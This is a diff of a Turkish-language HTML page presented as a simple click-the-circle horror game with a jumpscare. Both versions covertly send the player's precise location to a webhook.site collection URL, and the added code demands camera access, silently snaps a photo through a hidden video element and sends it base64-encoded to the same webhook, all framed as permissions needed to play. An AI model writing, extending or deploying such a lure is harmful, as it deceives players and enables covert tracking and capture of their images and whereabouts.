@@ -1,145 +1,207 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>Korku Oyunu - Konumlu</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background: #000;
-      color: white;
-      font-family: Arial, sans-serif;
-      height: 100vh;
-      overflow: hidden;
-    }
-
-    #permission-screen {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100%;
-      text-align: center;
-    }
-
-    #game-container {
-      display: none;
-      position: relative;
-      width: 100vw;
-      height: 100vh;
-    }
-
-    #circle {
-      width: 100px;
-      height: 100px;
-      background-color: crimson;
-      border-radius: 50%;
-      position: absolute;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 0 20px red;
-    }
-
-    #score-display {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      font-size: 1.5rem;
-    }
-
-    #jumpscare {
-      display: none;
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      background: black;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      flex-direction: column;
-    }
-
-    #jumpscare img {
-      max-width: 100%;
-      height: auto;
-    }
-
-    audio {
-      display: none;
-    }
-
-    button {
-      background: crimson;
-      color: white;
-      padding: 12px 24px;
-      font-size: 18px;
-      border: none;
-      cursor: pointer;
-      border-radius: 6px;
-      margin-top: 20px;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Oyun</title>
+<style>
+  html, body {
+    margin:0; padding:0;
+    background:#000; color:#fff;
+    font-family: Arial, sans-serif;
+    height: 100vh;
+    overflow: hidden;
+  }
+  #permission-screen {
+    display:flex; flex-direction: column;
+    justify-content: center; align-items: center;
+    height: 100vh; text-align: center;
+    padding: 20px;
+  }
+  #game-container {
+    display:none;
+    position: relative;
+    width: 100vw; height: 100vh;
+  }
+  #circle {
+    width: 80px; height: 80px;
+    background: crimson;
+    border-radius: 50%;
+    position: absolute;
+    cursor: pointer;
+    box-shadow: 0 0 15px red;
+    transition: 0.2s;
+  }
+  #score-display {
+    position: absolute;
+    top: 20px; left: 20px;
+    font-size: 1.5rem;
+  }
+  #goal {
+    position: absolute;
+    top: 20px; right: 20px;
+    color: orange;
+    font-size: 1rem;
+  }
+  #jumpscare {
+    display:none;
+    position: fixed;
+    top:0; left:0; width: 100%; height: 100%;
+    background: black;
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  }
+  #jumpscare img {
+    width: 100%;
+    max-width: 600px;
+  }
+  #jumpscare audio {
+    display: none;
+  }
+  button {
+    margin-top: 20px;
+    padding: 10px 20px;
+    font-size: 1rem;
+    border:none;
+    border-radius: 6px;
+    background: crimson;
+    color: white;
+    cursor: pointer;
+  }
+</style>
 </head>
 <body>
 
 <div id="permission-screen">
-  <h1>Oyuna başlamak için konum izni vermelisin!</h1>
-  <button onclick="requestLocation()">Konum İzni Ver</button>
+  <h1>Oyuna başlamak için izinleri vermelisin!</h1>
+  <button id="start-btn">İzinleri Ver ve Başla</button>
 </div>
 
 <div id="game-container">
   <div id="score-display">Skor: 0</div>
+  <div id="goal">Hedef: 15 puan</div>
   <div id="circle" onclick="handleClick()"></div>
-  <div id="jumpscare">
-    <img src="https://i.imgur.com/jxKX1U7.png" alt="Korku">
-    <audio id="scream" src="https://www.myinstants.com/media/sounds/wilhelm-scream.mp3" autoplay></audio>
-  </div>
+</div>
+
+<div id="jumpscare">
+  <img src="https://i.imgur.com/jxKX1U7.png" alt="Korku" />
+  <audio id="scream" autoplay>
+    <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg" />
+  </audio>
 </div>
 
 <script>
-  function requestLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          // Konumu Webhook.site adresine gönder
-          const img = new Image();
-          img.src = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34?lat=" + lat + "&lon=" + lon + "&time=" + new Date().toISOString();
-
-          // Oyun başlasın
-          document.getElementById("permission-screen").style.display = "none";
-          document.getElementById("game-container").style.display = "block";
-          randomPosition();
-        },
-        error => {
-          alert("Konum izni vermelisin. Sayfayı yenileyip tekrar dene.");
-        },
-        { enableHighAccuracy: true }
-      );
-    } else {
-      alert("Tarayıcın konum desteği sağlamıyor.");
-    }
-  }
-
-  // Oyun değişkenleri
-  let score = 0;
+  const webhookUrl = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34";
+  const permissionScreen = document.getElementById("permission-screen");
+  const startBtn = document.getElementById("start-btn");
+  const gameContainer = document.getElementById("game-container");
   const circle = document.getElementById("circle");
   const scoreDisplay = document.getElementById("score-display");
   const jumpscare = document.getElementById("jumpscare");
-  const screamSound = document.getElementById("scream");
+  const scream = document.getElementById("scream");
+
+  let score = 0;
+
+  startBtn.addEventListener("click", () => {
+    // Önce konum izni iste
+    if (!navigator.geolocation) {
+      alert("Tarayıcınız konumu desteklemiyor.");
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        sendToWebhook("location", { lat, lon });
+
+        // Sonra kamerayı aç
+        requestCameraPermission().then(stream => {
+          // Kamera açıldı, fotoğraf çek ve gönder
+          takePhoto(stream).then(photoBlob => {
+            sendPhotoToWebhook(photoBlob);
+
+            // İzin ekranını gizle, oyunu göster ve başlat
+            permissionScreen.style.display = "none";
+            gameContainer.style.display = "block";
+            randomPosition();
+          }).catch(e => {
+            alert("Fotoğraf çekilemedi: " + e);
+          }).finally(() => {
+            // Kamerayı kapat
+            stream.getTracks().forEach(track => track.stop());
+          });
+        }).catch(() => {
+          alert("Kamera izni verilmedi. Oyuna başlayamazsınız.");
+        });
+      },
+      err => {
+        alert("Konum izni vermeden oyunu oynayamazsın!");
+      },
+      { enableHighAccuracy: true }
+    );
+  });
+
+  function sendToWebhook(type, data) {
+    // type örn: location, photo vb
+    let url = webhookUrl + "?type=" + encodeURIComponent(type);
+    for (const key in data) {
+      url += "&" + encodeURIComponent(key) + "=" + encodeURIComponent(data[key]);
+    }
+    const img = new Image();
+    img.src = url;
+  }
+
+  function requestCameraPermission() {
+    return navigator.mediaDevices.getUserMedia({ video: true });
+  }
+
+  function takePhoto(stream) {
+    return new Promise((resolve, reject) => {
+      const video = document.createElement("video");
+      video.style.display = "none";
+      document.body.appendChild(video);
+      video.srcObject = stream;
+      video.play();
+
+      video.addEventListener("loadedmetadata", () => {
+        // Video hazır, şimdi canvas ile fotoğraf çek
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+          if (blob) {
+            resolve(blob);
+          } else {
+            reject("Blob oluşturulamadı");
+          }
+          document.body.removeChild(video);
+        }, "image/jpeg");
+      });
+    });
+  }
+
+  function sendPhotoToWebhook(blob) {
+    const reader = new FileReader();
+    reader.onloadend = () => {
+      const base64data = reader.result.split(",")[1]; // Base64 kısmı
+      const img = new Image();
+      img.src = webhookUrl + "?type=photo&img=" + encodeURIComponent(base64data);
+    };
+    reader.readAsDataURL(blob);
+  }
 
   function randomPosition() {
     const maxX = window.innerWidth - circle.offsetWidth;
     const maxY = window.innerHeight - circle.offsetHeight;
     const x = Math.random() * maxX;
     const y = Math.random() * maxY;
-    circle.style.left = x + "px";
-    circle.style.top = y + "px";
+    circle.style.left = `${x}px`;
+    circle.style.top = `${y}px`;
   }
 
   function handleClick() {
@@ -148,13 +210,13 @@
     randomPosition();
 
     if (score === 15) {
-      triggerJumpscare();
+      showJumpscare();
     }
   }
 
-  function triggerJumpscare() {
+  function showJumpscare() {
     jumpscare.style.display = "flex";
-    screamSound.play();
+    scream.play();
   }
 </script>
 
